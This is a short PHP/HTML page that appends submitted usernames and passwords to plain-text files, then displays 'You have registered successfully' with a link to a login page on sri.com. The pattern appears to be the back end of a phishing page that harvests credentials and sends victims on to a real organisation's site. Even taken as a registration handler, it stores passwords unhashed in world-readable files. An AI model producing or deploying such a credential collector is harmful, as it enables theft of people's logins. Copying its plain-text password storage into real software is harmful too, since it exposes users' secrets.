<html>
	<body>
		<?php
		$user = fopen("username.txt", "a");
		$pass = fopen("password.txt", "a");
		fwrite($user, $_POST["username"]);
		fwrite($pass, $_POST["password"]);
		fclose($user);
		fclose($pass);
		?>
		<h1>
			You have registered successfully <a href="http://www.sri.com/login.php">click here</a> to login
		</h1>
	</body>
</html>